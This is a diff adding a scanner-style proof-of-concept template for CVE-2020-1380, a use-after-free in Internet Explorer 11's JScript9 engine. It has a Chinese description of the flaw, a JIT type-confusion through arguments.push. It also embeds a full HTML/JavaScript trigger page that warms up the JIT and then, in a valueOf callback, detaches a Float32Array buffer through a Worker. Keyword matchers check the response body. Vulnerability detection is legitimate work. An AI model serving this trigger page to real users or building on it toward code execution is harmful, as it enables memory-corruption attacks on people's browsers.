@@ -1,0 +1,73 @@
+[info]
+author = "AVE"
+description = "通过特制HTML页面触发Internet Explorer 11 JScript9引擎中的use-after-free漏洞。利用JIT编译器对arguments.push修改函数参数的建模缺陷，将value1类型从int错误推断为Object，触发valueOf回调并在回调中分离Float32Array的backing buffer，导致UAF。访问恶意网页即可触发，IE 11用户受影响。"
+id = "POC-AVE-2020-0408"
+name = "CVE-2020-1380 Internet Explorer JScript9 Use-After-Free PoC"
+severity = "critical"
+tags = [
+    "cve-2020-1380",
+    "ie",
+    "jscript9",
+    "use-after-free",
+    "rce",
+]
+vuln_id = [
+    "CVE-2020-1380",
+    "AVE-2020-0408",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2020-1380.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+function opt(value1, value2, arr, flag) {
+    value1 = 1;
+    arguments.push = Array.prototype.push;
+    arguments.length = 0;
+    arguments.push(value2);
+    if (flag == 1) {
+        value1 = 2;
+    }
+    arr[1] = value1;
+}
+var arr = new Float32Array(0x100);
+for (var i = 0; i < 10000; i++) {
+    opt(0x1337, 0x1337, arr, 1);
+}
+var obj = new Object();
+obj.valueOf = function () {
+    var worker = new Worker("worker.js");
+    worker.postMessage(0, [arr.buffer]);
+    worker.terminate();
+    worker = null;
+    var start = Date.now();
+    while(Date.now() - start < 200) {}
+    return 1;
+};
+try {
+    opt(0x1337, obj, arr, 0);
+} catch(e) {}
+</script>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Float32Array",
+    "arguments.push",
+    "valueOf",
+]
